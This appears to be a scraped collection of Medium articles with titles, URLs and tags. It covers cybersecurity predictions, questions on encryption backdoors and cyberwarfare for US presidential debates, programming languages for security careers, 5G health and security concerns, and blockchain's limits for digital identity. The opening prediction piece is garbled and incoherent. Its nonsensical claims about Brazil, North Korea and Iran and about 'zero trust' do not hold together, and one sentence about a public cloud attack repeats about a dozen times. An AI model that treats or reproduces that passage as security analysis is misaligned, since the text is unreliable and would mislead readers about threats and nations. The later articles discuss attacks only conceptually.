A ‘zero trust’ approach requires an organization and AI-enabled malware. This ‘zero trust’ approach can open up several attack vectors. First, it transfers risk and no one can rest easy. Second, organizations end up creating their own criminal activities. The embrace of Google’s BeyondCorp is a strategic guess by taking intelligence, which will become more clear across the field.
2019 might just be the toughest in the United States to date. While a direct cyberwar is not on the horizon, a nation-state will launch a “Fire Sale” attack: electronics on fire. You may remember the fictional concept of a “fire sale” attack from the 4th Die Hard movie, in which a terrorist demonstrated this.
Governments will be fed a false sense of security intelligence from tapped infected machines. Nation-states have launched huge distributed denial of services, Bitcoin mixers, and counter-antimalware services. These attacks mean governments are deeply suspicious of each threat actors’ criminal groups.
Brazil recently passed new process-injections and erased event logs to aid trade wars. North Korea, meanwhile, has allegedly attacked public and privacy needs. We are looking forward to seeing a steady increase in Iranian attackers that will continue to fall further and further behind in competency and integrity.
The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud will experience a massive security attack The worldwide public cloud services market is still taking shape, with many brands still looking to develop weapons in the creation of malicious executables.
Written by
","['Cybersecurity', 'Security', 'Information Security', 'Predictions', 'AI']"
3 questions on cybersecurity that should be asked in the debates,https://medium.com/@kshortridge/3-questions-on-cybersecurity-that-should-be-asked-in-the-debates-7438fb3164a0?source=tag_archive---------3-----------------------,"While the first U.S. presidential debate included an open-ended, broad question about each candidate’s stance on cybersecurity, it accomplished little in helping citizens understand the candidates’ actual policy positions — nor why cybersecurity policies are relevant at all on the national scale. Saying “cybersecurity is important” for the U.S. today is like saying “having a military is important.” But, it was also clear from the responses, such as bringing up Daesh’s use of the internet for recruitment or using the term “the cyber,” that there’s a lack of mainstream understanding of what cybersecurity actually means in a policy context (the argument against the term “cyber” and its derivatives is left for another day).
Here’s my best attempt at a definition as far as most citizens are concerned: cybersecurity at the national level includes 1) methods and resources to conduct geopolitical, intelligence-gathering, or offensive operations, and 2) methods and resources to defend against digital attacks that might threaten national security, individual liberties, or our economic viability.
Simply put, cybersecurity is the newest domain both for warfare and way of life, and thus has policy implications at a national scale. It would be a grave mistake to underestimate the importance of cybersecurity in geopolitical strategy and how much our “life, liberty and the pursuit of happiness” depends on it today.
So, without further ado, here are the three questions I think are worthy of being asked at the next two debates, as well as why you, as a citizen, should care about their answers. If you think a question is worth asking, vote for it by clicking the relevant link below.
The way the candidates answer this question primarily will show to what degree they are aligned to constitutional rights plus the needs and desires of citizens vs. what “the powers that be” (primarily the FBI) say is necessary. Secondarily, it will show how open they are to listening to expert opinions in a particular area, as the overwhelming majority of cybersecurity professionals are vehemently and publicly against encryption backdoors.
There have been multiple encryption debates throughout the years, but the most recent focuses on encryption backdoors. Let’s start with a basic definition of encryption: it’s a “process of ciphering information in such a way that only authorized parties can read it.” It’s not hyperbole to say encryption is part of everything you use online — from online banking, online shopping, email, electronic medical records to Facebook chat. It is a fundamental part of what makes the internet economy as we know work by adding in a layer of trust.
Now, what’s a backdoor? A backdoor is an intentionally-placed method of bypassing a security mechanism in software, and is most often used to gain unauthorized access to something. In the context of encryption backdoors, it is specifically to obtain the “plaintext” or raw data. For example, encrypted data might look like “IUFdjxi/FI8+2zv/WbEUq=M+b…” while the plaintext says “I like pizza.”
By way of analogy, an encryption backdoor is similar to designing a physical lock with a master key that can always open the lock if needed. It’d be naive to assume that only the designated owner of the master key (for example, the government) could unlock the lock. Someone else could examine the way the lock is designed, deduce how the master key looks, and create one on their own.
The implications for an encryption backdoor are even worse than that analogy — at least in the physical lock case, there’s a slight barrier in that physical proximity is still needed to use the master key. In the digital case, a hacker doesn’t even have to move in order to use the master key across a bunch of different digital “locks” in any location in the world.
The FBI has been the most notable proponent of encryption backdoors, as highlighted in their battle with Apple earlier this year. Further, in 2007, a backdoor was discovered in the encryption algorithm supported by the NSA, which would have meant that companies who adopted the NSA’s recommend encryption algorithm would have developed software susceptible to attack or data interception. The argument in favor of encryption backdoors generally rests on the use of encryption by criminals or other bad actors, and the worry that encryption allows them to “go dark” (i.e. make it harder for someone to intercept or access their data).
However, the overwhelming majority of cybersecurity experts are against backdoors, primarily because there’s absolutely no way to ensure that these “trap doors” aren’t discovered by hackers, criminals or combative nation-states and used against American citizens, corporations, banks, utilities, troops or the government itself. It cannot be stressed enough that the “harsh technical realities make a [lawful access only] solution effectively impossible.”
Requiring encryption backdoors also would place a huge financial and resource burden on private enterprises by requiring software developers to design systems in a way that allows law enforcement to gain access as needed — or desired. Further, no matter how you decide who is granted access to the “master key” for these backdoors, they immediately become an attractive and lucrative target for cyberattack — potentially pouring many millions of dollars of extra risk onto the shoulders of private enterprises.
If you’d include yourself among people who care about the following, you should be strongly against requiring — or the even existence of — encryption backdoors:
As you can recognize from the list, this isn’t a partisan issue.
Many people use the “I have nothing to hide” argument when first hearing about the encryption debate. That also happens to be irrelevant — given the prevalence of digital communications in our modern lives, encryption is essential in preserving our constitutional rights.
But it’s also way beyond that. As I mentioned above, encryption is used in nearly everything you do online these days, and not just your communications. Purposefully backdooring encryption leaves an open hole for hackers to get your healthcare data, personal pictures of your kids, drain your bank account, run up your credit card, or steal your identity. The vibrant, useful, trillion-dollar internet economy as we know it would not and could not exist without encryption.
As Matt Blaze, a leading expert on encryption, said in his recent testimony before Congress:
This is not simply a matter of weighing the desires for personal privacyand for safeguards against government abuse against the need for improvedlaw enforcement… [Backdoors] will provide rich, attractive targets not only for relatively petty criminals such as identity thieves, but also for organized crime, terrorists, and hostile intelligence services. It is not an exaggeration to understand these risks as a significant threat to our economy and to national security.
With the follow-up: “Would you include election and electronic voting systems under the definition of critical infrastructure?”
Each candidate would outline their plans for for the federal government’s role in protecting critical infrastructure. Additionally, we’d hear each candidate’s proposals for addressing and solving some of the key challenges in protecting critical infrastructure in order to judge how much they recognize the threat and how effective they’d be in preserving our national security, economy and way of life.
Critical infrastructure, as per the Patriot Act, is defined as:
systems and assets, whether physical or virtual, so vital to the U.S. that the incapacity or destruction of such systems or assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters
The NIST Cybersecurity Framework suggests a host of industries fall under this label, including agriculture, water, public health, emergency services, government, defense, information & telecommunications, energy, transportation & shipping, banking & finance, chemicals & hazardous materials, post, national monuments & icons and critical manufacturing.
Many would argue that the list should also include election and electronic voting systems, as they are a vital component of maintaining democratic elections (and I personally would agree). Particularly in light of the recent revelations that Russian actors hacked the DNC as well as the Illinois and Arizona election systems (and attempted to hack many more), the plea by information security experts to have the security of voting systems be taken more seriously is steadily gaining legitimacy.
The reason why federal-level protection of critical infrastructure from cyber attacks is up for debate is that, currently, the onus is primarily on the private sector to defend itself. However, the same isn’t true for physical threats such as potential terrorist attacks — should the owner of the World Trade Center have conducted their own anti-terrorism operations and had fighter jets ready to escort a hijacked plane? Of course not.
If the federal government is in charge of protecting national security, then it’s logical to suggest that they should also take the lead on all national security, including securing national infrastructure. However, given the complexities of our physical and virtual infrastructure, and consequently the large number of industries that fall under the critical infrastructure label, there is disagreement over the extent to which the federal government should help bolster their cybersecurity. We, as citizens, should hear what the candidates respective positions are on this important issue.
Additionally, the how to do it is potentially more subjective and could include anything from recommending minimal security standards (which is the default, albeit ineffective, strategy) to imposing fines on software vendors for vulnerabilities or conducting cyber deterrence (which I dig into more in the last question). I, for one, would like to know the candidates ideas on the “how to” as well.
If you care about our national security, you should care about this question. It’s safe to say it’s a bipartisan desire for the local power plant not to blow up, to avoid a food crisis or not have our financial system come to a standstill.
The reason why you should care about each candidate’s specific answer to the question is because the level of cybersecurity in critical infrastructure is, in general, alarmingly poor, increasing the likelihood and severity of devastation of a cyber attack on critical infrastructure at any time. While I don’t condone FUD (fear, uncertainty and doubt as a media strategy), I will say that it’s far better to act now to reduce the probability of a calamitous digital attack on our critical infrastructure than keep our fingers crossed that it won’t happen.
There are a few cybersecurity challenges faced by these industries, though. First, there’s a massive shortage of talent, and those who are practitioners generally go to industries who can pay the most (like tech and financial services). Perhaps workers in declining industries could be given incentives to retrain with cybersecurity skills. Second, critical infrastructure systems usually are complex and a lot of infrastructure software is old, and it’s difficult to install or integrate security measures after the fact. Third, a single private entity won’t have the same level of information about potential digital threats as the federal government, nor the resources to prevent against every possible scenario. By leveraging the U.S. intelligence community’s data, private entities in critical industries could be given a “heads up” on potential threats and guidance on the tactics, techniques and procedures of groups likely to target them in a cyberattack.
With the follow-up: “What role do you think cyber deterrence plays in cyberwarfare?”
The candidates’ answers to this question should reveal:
The domains of warfare were traditionally Land, Sea, Air and Space, but Information Operations (i.e. the digital domain) became the fifth dimension for the U.S. Military in 1995. Since then, information operations, or “cyberwarfare” as dubbed by the media, has become a crucial component of military strategy due to the proliferation of digital systems globally and their importance in all areas of modern life.
The two main types of cyberwarfare are espionage and sabotage. Espionage is used for spying purposes to gain intelligence; for example, the hack of the Office of Personnel Management (presumably by China) was to gain intelligence on people who work for various U.S. government agencies. Sabotage is used to disrupt adversaries’ systems for geopolitical or military gain. For example, rather than conducting some sort of strike on Iran’s nuclear facilities, the U.S. leveraged its offensive cybersecurity capabilities to covertly disrupt Iran’s nuclear program in an attack later dubbed “Stuxnet.”
Cyberwarfare is particularly reliant on intelligence (part of why the NSA has expanded so much over the past two decades), and thus most operations tend to fly under the radar. It would reduce a government’s advantage to reveal capabilities or methods, since then adversaries could better thwart attacks or repackage the attack for their own use.
This highlights the difficulty of cyber deterrence. Being able to attribute cyber attacks to a specific nation-state requires revealing, in part, how you were able to figure out who did it. If you don’t present evidence, it can be dismissed as a baseless accusation, which isn’t great for geopolitical maneuvering. Even then, attribution is notoriously difficult since attackers can attempt to mask their digital tracks, including by making it appear that their attack originated from a different location or by using a different language than their own.
In any case, to dissuade adversaries from attacking us, the U.S. has to make it clear that the intelligence community will figure out who is behind any attacks against us, retaliate swiftly and inflict significant damage…all without revealing the extent of our capabilities.
It is evident that the U.S. currently has a decisive advantage in the nation-state cybersecurity arena — anyone suggesting otherwise, as seen in this election, is misinformed. We began preparing for, and conducting, offensive cyber operations about a decade before others, giving us a significant head start. Further, the dominance we have over global digital infrastructure is extremely difficult to replicate and that fact makes our cyber operations smoother to conduct. For example, as revealed by the Snowden leaks, the U.S. taps into undersea fiber optic cables that serve as the fundamental communication rails of the internet — giving access to any data that is transmitted over these cables.
To be clear, Russia, China and Iran all have highly intelligent and capable cybersecurity teams (to varying degrees of size and sophistication). But we can conduct offensive cybersecurity operations on a bigger scale. We not only can perform equally as sophisticated attacks, but we also possess a formidable information advantage to better craft attacks and anticipate attacks against us.
This doesn’t mean we’ll never be attacked, due to the aforementioned abilities of our adversaries — though the cyber deterrence strategy is meant to dissuade others from attacking us by showing our muscle. While we currently have superior offensive cybersecurity capabilities that give us a geopolitical advantage, this does not make us invulnerable to the potentially devastating effects of cyberattack against us by a capable nation-state. On the other hand, an offensive operation presents the risk of being caught, which might be viewed as a declaration of war — thus leading to retaliation against us (which isn’t ideal). So, we have to be judicious in how we leverage our offensive cybersecurity capabilities to balance optimizing our foreign policy goals while protecting our own national security.
Do I think these questions will be asked at the debates? No (but fingers crossed). I don’t think there’s a sufficient public understanding of the multifarious policy issues presented by cybersecurity — largely because the media coverage of cybersecurity is notoriously terrible.
However, raising voter awareness of these issues still is critically important. Real change won’t happen if it’s just the information security or privacy community who is concerned…and it really shouldn’t just be them, since cybersecurity issues affect all citizens.
Cybersecurity’s importance in our nation’s ecosystem only will grow, so starting the discussion of these issues now means there’ll be a deeper consciousness of them among voters in the next election — and a greater ability of “the people” to ensure their rights and security are preserved as we march past the point of no return into digital dependence.
Vote for any of the questions here:
Written by
","['Privacy', 'Cybersecurity', '2016 Election', 'Presidential Debates', 'Tech']"
5 Best Programming Languages to Learn for Cyber Security,https://medium.com/hackernoon/5-best-programming-languages-to-learn-for-cyber-security-be97071919f9?source=tag_archive---------3-----------------------,"Becoming successful as a cyber security expert requires diverse skills. An all-round professional can confidently implement and monitor security measures that guard computer systems against attacks and unauthorized access.
Henrique, a Brazil-based Python expert who teaches people how to create applications using the language, emphasizes that “besides keeping abreast with the latest happenings in the cyber security field, you also need to be acquainted with various programming languages.”
Here are 5 best programming languages to learn to make your cyber security career worthwhile.
C and C++ are critical low-level programming languages that you need to know as a cyber security professional.
These languages provide access to low-level IT infrastructure such as RAM and system processes, which if not well protected, hackers can easily exploit.
The C programming language is the backbone of most operating systems. It is a lean, flexible, and efficient language that can be used to complete a wide range of tasks such as cryptography, image processing, and socket networking.
Essentially, C++ is usually regarded as C’s big brother — which has been concocted with crack, meth, and steroids and mixed without any favors. C++ is a fantastic language that is largely based on C’s source code.
There are several cyber security programs created using C++. For example, Nmap, the network mapper tool, is created using C++.
Here is a marvelous quote from Bjarne Stroustrup, the creator of C++:
“C makes it easy to shoot yourself in the foot; C++ makes it harder, but when you do, it blows your whole leg off.”
As a cyber security expert, if you are experienced at using C/C++ programming languages, you’ll know how to respond to attacks targeting lower level operations within your computing environment.
Python is a high-level programming language that is increasingly becoming popular among cyber experts.
It’s gaining traction mainly because of its adherence to code readability, clear and simple syntax, and availability of an extensive number of libraries.
So, whatever task you want to do, you can always complete it easily with Python.
For example, you can use the language to send TCP-packets to machines, perform malware analysis, and create intrusion detection systems with minimal reliance on third-party tools.
However, unlike C/C++, Python is not low-level; therefore, it may not provide enough visibility to hardware resources.
Learning Python for cyber security will give you an edge in your career. You’ll be equipped with programming skills that can assist you to identify vulnerabilities and discover how to fix them.
JavaScript is a high-level programming language, which is often referred as the “lingua franca” of the web.
JavaScript is a core technology that powers the Internet. Primarily, it’s the language that adds interactivity to web pages.
Although JavaScript was initially implemented only on the client-side in web browsers, it’s now possible to use the language in other types of host infrastructure, such as server-side in databases and offline applications like PDF programs.
Therefore, because of its extensive usage, learning JavaScript can make you go one step ahead of the hackers.
You’ll understand the concepts of how websites and other applications work and the best designs to employ to ward off malicious users.
For example, cross-site scripting is a JavaScript-based attack that involves an attacker implanting malicious code in a web application.
If you are experienced in using the JavaScript programming language, you can prevent such types of attacks from occurring.
PHP is a server-side programming language for developing websites. Because most websites are created using PHP, learning the language will enable you to know how to fend off intruders.
For example, DDoS (Denial-of-service) attacks usually attempt to make web applications unavailable to intended users.
With PHP programming knowledge, coupled with skills in other technologies like JavaScript, you can implement robust solutions to secure web applications.
SQL (Structured Query Language) is mostly used in managing data stored in databases.
Because of the current explosion of data storage systems, SQL is widely used for maintaining and retrieving data.
Similarly, hackers are increasingly orchestrating the language for damaging or exfiltrating the stored data.
For example, SQL injection attacks involve exploiting SQL vulnerabilities to steal or modify data kept in databases.
Therefore, having a good understanding of the SQL language is critical in your cyber security career.
The above is not an exhaustive list of the best programming languages for cyber security.
Depending on your specific use-case, you may find that one language fits your role better than the others.
For example, if you want to focus on securing the frontend of a web application, learning JavaScript could be your ideal choice.
Nonetheless, to be an all-round cyber geek, you need to employ a reconnaissance-approach: the more languages you learn, the better.
You never know which one could save your day.
Which is your best cyber security programming language?
Please share your thoughts in the comment section below.
Written by
","['About', 'Help', 'Go Home', 'Programming', 'Cybersecurity', 'Python', 'JavaScript', 'Sql']"
5G Networks Can Change The Way We Live: For Better or Worse?,https://medium.com/hackernoon/5g-networks-can-change-the-way-we-live-for-better-or-worse-ed2b3fc6b0e6?source=tag_archive---------3-----------------------,"The advances in wireless communications has led to an exponential growth in mobile devices i.e. smartphones. The deployment of 4G and LTE (Long Term Evolution) networks has delivered us more rich content, from video streaming to live gaming. It is taking its toll on bandwidth, which now needs to be addressed as demand grows. This time around a new class of applications that are bandwidth intensive like VR (Virtual Reality), AR (Augmented Reality) and OTT will require it. The telecom industry have specified a new standard called 5G to meet the growth of network demands. High speed data communications made possible by more bandwidth sounds like an excellent business proposition for wireless carriers to expand their networks, appease users and gain more subscribers while generating more revenues.
This is also a new opportunity for developers to deploy applications that take advantage of fast, high-speed lower latency networks. Emerging technologies like self-driving cars, serverless applications, autonomous vehicles, live online gaming, IoT devices, time sensitive telemedicine and even blockchain projects have a potential to benefit from this. It may even replace home cable networks as a residential broadband service.
The previous exponential growth in mobile and other computing devices can also be handled since 5G aims to provide more bandwidth. Just 20 years ago we didn’t have billions of mobile users. Now and beyond, the projections are seeing growth that have surpassed the billion mark. By 2020 there will be a projected 4.68 billion mobile users in the world. The growth is not that exponential as it begins to flatten out, but you have a large base of users from the previous years. The data just shows us how large the mobile market is and its potential for 5G use. It is not indicative of who will use 5G which I shall explain later on.
5G rollout is not without controversy though. There are always two sides to a story, and when it comes to 5G there are proponents who want to get the show on the road but there are also opponents who argue about the risk to public health and security that 5G networks may bring. Who is right and who is wrong? At this point there are more questions than answers. Let me begin by explaining what 5G is and then discuss the pros and cons.
The wireless communications industry is introducing 5G as the successor to current 4G LTE networks. 4G used LTE and WiMax to deliver a peak speed of 100 Mbps to wireless devices. 5G has a peak data rate of 20 Gbps, using eMBB (Enhanced Mobile Broadband). That increases the bit rate which increases speed and that can also lower delays in content delivery to mobile devices. Users on facetime will have little to no lag and downloading large files will be effortless.
With faster 5G connectivity access to content will increase tremendously and speeds will increase significantly. Watching 4K UHD content on mobile devices will stream effortlessly. A doctor can have a smooth video conference with a patient with more clarity and audio fidelity. Gamers can now play more immersive video games in VR while chatting, streaming and downloading at the same time. More cloud based collaboration among peers. 5G may also facilitate the rise of smart cities and self-driving cars. These are just some of the many benefits that 5G can provide once it is rolling.
5G uses what are called “millimeter waves”, or short wavelength radio signals. This requires a new swath of bandwidth that is allocated on the frequency spectrum between 30–300 GHz. This increases the bandwidth available to cram more data and accommodate more users. This will require shorter wavelengths than previous networks, which means they cannot travel longer distances. These signals also cannot easily penetrate through walls and are easily absorbed by moisture and foliage. So why would engineers build a system that cannot travel far and has major drawbacks? That leads to the second feature of 5G (next item).
To make sure that signals are able to travel farther without fading, “small cell” towers using a dense deployment will be installed within an area to handle the signaling. They will be much smaller than your typical cellular tower. These small cell towers will be placed within a distance of no less than 200 feet and no more than 1,000 feet apart, so they are pretty close to each other. The advantage to being smaller is that there is more versatility to where they can be installed. They can be put on the side of buildings, utility poles, apartment rooftops just to give a few examples. The small cells then transmit and receive data on the 5G network covering a certain area. So the idea of 5G is replacing high power, low frequency towers with low power, high frequency small cells that communicate with a base station.
To handle data traffic signaling, “beamforming” will be used. It determines the most efficient data delivery route in a 5G network. Beamforming actually sends the data from the small cell directly to the user. Since the signal is more concentrated, it reduces interference as well. Like its predecessor 4G, a 5G network makes use of packet switching over an IP network for data delivery.
MIMO or “Multiple-Input Multiple-Output” allows more signals to be sent and received at any given moment. This is implemented by installing more antennas as an array in a small cell. The problem of having so many antennas installed is addressed by beamforming. With MIMO, a base station can send and receive more signals to boost the capacity of a 5G network by a factor of 22, first reported by engineers at the University of Bristol and Sweden’s Lund University.
FACT: Wireless providers don’t actually use full-duplex transceivers. In a 5G network, the use of full-duplex will allow data to be transmitted and received on base station transceivers at the same time using the same frequency. Past systems that supported full-duplex communications had to separate frequency channels to allow 2 users to communicate at the same time without having to take turns transmitting and receiving. Now it is possible using just one frequency channel through a circuit design which utilize high speed switching in the silicon. This allows antennas to transmit and receive while the incoming and outgoing signals are routed.
It looks pretty straightforward on paper. 5G is just another iteration of a wireless communication system that aims to deliver faster data speeds and handle more users. There are 2 main issues that critics are concerned about: public health and network security.
Activists, researchers and health professionals alike have concern for the high frequency millimeter radio signals that 5G uses. Since many small cells will be installed in close proximity to people, there must be a concerted effort to further research and evaluate the effects it could have. There are physicians who warn that the amount of radiation 5G small cells emit can have irreversible effects on people who live or are exposed to these radio waves on a daily basis.
These reports are alarming and can be a cause for fear. I don’t dismiss them at all because before any public rollout of a project there should always be an environmental impact assessment that includes public health and safety. While most critics point out the possible harm 5G can cause, there have been no significant studies that positively without a doubt prove that wireless networks have increased cancer or other illnesses. Epidemiological studies don’t have any conclusive evidence that correlates wireless and mobile use to higher incidents of diseases like cancer. We shouldn’t ignore the reports though because this is an opportunity for regulators to take a further look into 5G operation and whether it is safe to deploy.
The high frequency in question is the range 5G uses, which can go as high as 300 GHz. In the electromagnetic spectrum the range of harmful radio waves are in the gamma ray and x-ray range. The range 5G uses is in the microwave range of the spectrum. Some activists wrongly believe that 5G signals are like that used in microwave ovens. While that is true, that 5G signals are in the microwave range of the electromagnetic spectrum, there is a difference between a small cell and an oven. Microwave ovens use high energy to cook food from the inside out. Small cells use low energy to transmit and receive radio signals. They have different applications of radio waves.
If you live in a sunny region like Southern California, you are already being exposed to more radiation than microwave signals from 5G. This is because visible light has a higher frequency than 5G signals and people are more exposed to sunlight. People can also get diseases from too much exposure from a component in sunlight that comes from ultraviolet rays. The range of high frequency radiation above visible light that poses dangers to health are gamma rays and x-rays aka “ionizing radiation”. Prolonged exposure causes cellular damage and also affects DNA so they are very harmful. That is why during an x-ray a patient is given special preparation and only a quick exposure to them. This is because x-rays can penetrate through skin and bone, thus we can develop them as an image on film making them highly valuable diagnostic imaging systems for healthcare. 5G signals do not penetrate human skin and bone. Most of the radiation in this range of frequencies is in the form of heat, which does not disrupt or destroy human tissue during transmission of radio waves.
More serious academics don’t argue that people are already exposed to higher frequency visible light and even infrared which is used in TV remote controls. However the issue is that when you deploy a system of 5G small cells, they are continuously transmitting wireless signals that bombard its surroundings. Though 5G uses beamforming to concentrate signal transmission rather than broadcasts, critics will still want more evaluation and testing to verify the safety of 5G.
Many research reports, in general, do not find any overall harmful effects on human health from radio waves. The FCC (Federal Communications Commission) actually has strict regulations on radio waves based on the SAR (Specific Absorption Rate). The SAR is the amount of energy allowed to be absorbed by a certain part of the body that is deemed the limit for public safety. The FCC rule is that SAR level must be at or below 1.6 W per kilogram (W/kg) taken over the volume containing a mass of 1 gram of tissue absorbing the most signal. For 5G developers and telecom carriers, compliance to these standards are a must for business operations so as not to endanger the public.
The WHO (World Health Organization) states that:
“Despite extensive research, to date there is no evidence to conclude that exposure to low level electromagnetic fields is harmful to human health”
(Source: WHO About Electromagnetic Fields — Summary of Health Effects Key Point 6)
In another WHO study, we must still be cautious and proceed with research on the effects of radio waves.
“Considering the very low exposure levels and research results collected to date, there is no convincing scientific evidence that the weak RF signals from base stations and wireless networks cause adverse health effects.”
(Source: WHO Backgrounder On Base Stations And Wireless Technologies)
One report on the concerns regarding 5G can be read from an article published by Dr. Cindy Russell (Santa Clara Medical Association).
There is no perfect system that is 100% secure from cybersecurity attacks. All it takes is putting a server out on a public network and it is exposed to all users, good and bad. Since 5G aims to provide a backbone that brings more speed for IoT devices in homes and businesses, it also increases the threat vectors for hackers. This is to be taken seriously since more devices will have capabilities to connect to high speed networks. That is also an opportunity for hackers to target more devices.
An issue with new IoT devices connected to public networks is the configuration. Some owners may just put their device online without configuring it properly. There have already been studies about the dangers of IoT due to vulnerabilities that users may not be aware of. To address these concerns, cybersecurity experts always advise users to apply updates to their IoT devices and to make sure that they don’t use simple easy to guess passwords. Despite these warnings, people still do careless things.
Faster networks can also mean faster ways for viruses and malware to spread. If more users are on the network, then you also have the potential for more infected devices and systems than ever before. This is of course a worst case scenario. 5G is just the underlying layer for applications and services. Would building a security protocol on the network like 5G be the ultimate solution? It always remains to be seen, but as of now 5G has not yet been operating on a wide scale for cybersecurity experts to identify the vulnerabilities.
To counter the threats that faster 5G may bring, cybersecurity vendors are offering a new class of threat management and network security devices. There are now security products even for smartphones, since these devices will have the most connections to 5G networks. An AV (antivirus) installed on mobile devices like the same way they are installed on desktop computers provides a layer of defense for users by monitoring the device for any malicious activity.
There are reports that 5G has some network security issues according to Network World. In an excerpt from the article:
“One of those studies — a formal analysis of 5G authentication conducted by scientists from ETH Zurich, the University of Lorraine/INRIA, and the University of Dundee — found that criminals will be able intercept 5G communications and steal data because “critical security gaps are present,” the group says in their press release. That’s in part because “security goals are underspecified” and there’s a “lack of precision” in the 3GPP standards, they say.”
5G network operators will also have to keep a close watch for bad actors who can issue attacks on their systems. The small cell towers can even be targeted, so they must be installed in such a way that they are not easily compromised. The small cells will likely have sensors and cameras to make sure that they are not being tampered with.
In the US 5G deployment has been encouraged by the FCC under Chairman Ajit Pai. The FCC is paving the way for a smoother road to 5G deployment by providing the spectrum for coverage. Ajit Pai calls it the “FAST Plan” or “Facilitate American Superiority in 5G Technology.” The US will still look to modify regulations in this space as mentioned by Ajit Pai:
“But to deploy the hundreds of thousands of small cells and miles of fiber needed for 5G, we need to streamline regulations.”
Right now major telecom carriers have their own plans for 5G trials in preparation for commercial availability in 2020. One such trial that has been reported to the public is in Washington D.C. This is a project of Verizon and Nokia using the mmWave spectrum. Verizon provided the network while Nokia tested the radio equipment.
I would like to think of 5G as a fast flowing river for our digital bitstream. We now spend more time on the Internet sending e-mail, collaborating on the cloud, watching streaming content (i.e. YouTube, Netflix, Hulu, etc.) and engaging social media. Most of our data is also stored on the network and to access it requires our smartphones. With a fast network connection it no longer matters where you are, you will always have access to it. Our smartphones have become our main device since it provides us mobility to access information from anywhere.
Now going back to the user base of billions I mentioned earlier, it will still require upgrades in order to use. The current base of mobile users will not have automatic access to 5G because it will require upgrades to hardware. That means they will still need to purchase a 5G compatible smartphone or mobile device to get access to the network. With that said, there is a potential for further growth among smartphone vendors in this field. Once 5G rolls users will have to purchase new smartphones. Once again, this is going to create jobs for a growing industry as adoption widens in the transition from 4G to 5G.
The road to 5G will be faced with challenges regarding public health safety and network security. It still requires compliance for safety and operation in their respective countries. There might be interest groups who may want to capitalize or exploit this situation, which can further delay any rollout. Citizens can actually voice their concerns that would lead to stoppages of any deployment if a judge rules in their favor. There are scientific papers that support both sides of the issues. Most of the time it is business interest that wins not the scientific evidence or public confidence. We can see the benefits at this point, but not the effects. I feel these will need to be addressed in order for a more widely acceptable deployment of 5G.
Written by
","['About', 'Help', 'Go Home', '5g', 'Healthcare', 'Telecommunication', 'Cybersecurity']"
5 Identity Problems Blockchain Doesn’t Solve - Blake Hall - Medium,https://medium.com/@blake_hall/5-identity-problems-blockchain-doesnt-solve-ed4badb94398?source=tag_archive---------6-----------------------,"Blockchain enjoys a tremendous amount of hype in the market. Unfortunately, the hype around blockchain can obfuscate the actual capabilities and limitations of the new protocol. As with any new innovation, the most important question is: what problem does this innovation solve?
With respect to digital identity, there are five important problems blockchain fails to address:
Immutability
The blockchain is essentially a trusted, public ledger that uses a decentralized network of nodes to verify the integrity of a given transaction. On paper (and to idealists), a public blockchain enables a more democratic world where transactions and the network itself are unchained from centralized control. Unfortunately, the blockchain’s immutability does not hold under all conditions.
A “51% attack” allows an actor who controls 51% or more of the mining power on the network — the computing power that provides the “proof of work” to authenticate transactions — to create a new branch that would effectively overwrite and potentially reverse all of the transactions on the public blockchain. Dr. Gideon Greenspan put together a piece, The Immutability Myth, at Coindesk that explores this vulnerability in more detail. The short, sweet: 400 million dollars will buy enough mining equipment to equal the total mining power present on the bitcoin blockchain.
For a state actor, 400 million dollars, and even many multiples of that amount, is a trivial sum to invest in order to undermine a public blockchain. Given identity’s role in fighting terrorism in the financial sector, the risk of deploying and trusting a public blockchain at scale for sensitive transactions when it could be undermined by a state actor for hundreds of millions or billions of dollars is too high a risk to make a public blockchain for identity a viable approach. Private blockchains have mechanisms that can potentially overcome this challenge but then you are in more of a consortium control model, not too dissimilar from banks and Visa, versus a democratic control model.
Synthetic Identity
The most difficult challenge in identity is establishing that a) the identity claimed is real and unique and b) that the user claiming the identity is the rightful owner of that identity and not, say, a member of organized crime.
With respect to the first component of identity proofing, synthetic identity theft — a practice where identity thieves combine a social security number from one person, a birth date from another person, and an address from a third person to effectively create a fake or “synthetic” identity — is a challenge that blockchain can do little to solve. It is a ledger, it records, it doesn’t verify or issue identity. As a ledger, blockchain depends upon the integrity of the inputs to the ledger, and, if the inputs are bad, then the ledger will simply record the synthetic identity on the ledger — garbage in, garbage out.
To put the scale of this problem in perspective: the FTC and ID Analytics estimate that a full 80% of credit card fraud is attributable to synthetic identity attacks.
The United States government, specifically the Social Security Administration (SSA), not blockchain, can solve the synthetic identity challenge, but, unfortunately, SSA limits the use of their API to employment and income verification so the private sector is on its own with respect to identity proofing writ broadly. If SSA extended their API to the market at large — potentially in a limited way to white listed entities in regulated markets — then the synthetic identity problem is solved.
In this context, blockchain is just one protocol, among many, that might facilitate coordination, but it cannot substitute for the critical role that SSA plays as the authoritative issuer of America’s de facto national identifier or for SSA’s decision to abstain from provide a trusted API to the market.
Identity Verification
Once an identity is established as real and unique, the next challenge is to ensure that the user claiming the identity is in fact the rightful owner of that identity and not a criminal. This step is known as identity verification, and it is best done in-person a la a visit to the state DMV or online with stringent controls enforced per the National Institute of Standards and Technology (NIST) 800–63–2 or -3 standards. Even with those controls present, the process is imperfect and, if a bad actor does gain control of a real person’s identity, then blockchain cannot stop that bad actor from exploiting that person’s identity because authentication and identity proofing happen upstream.
NIST specifically notes in their recent blog post on trusted identity that “strengthening identity proofing while expanding options for remote and in-person proofing… is arguably the most difficult part of digital identity.” Multiple government agencies and private sector entities have suffered data breaches due to poor identity verification as DHS notes in a research solicitation here. And block chain does nothing to directly solve the identity proofing problem.
Blockchain advocates will likely point to the reputation that a public-private key pair that represents an identity might gain over time — giving confidence that the owner of the private key is in fact the legitimate owner of the identity given a history of trust — but this functionality is not new, does not require blockchain, and can be implemented today with a hashing repository, match keys built off one or more fields of PII to establish referenceable vertices, and existing protocols like OAuth 2.0, SAML 2.0, and OpenID Connect that can federate attributes and associated metadata regarding the identity proofing administered and the tenure of the login.
In fact, that is what we already do at ID.me and we filed a patent on the approach back in 2015.
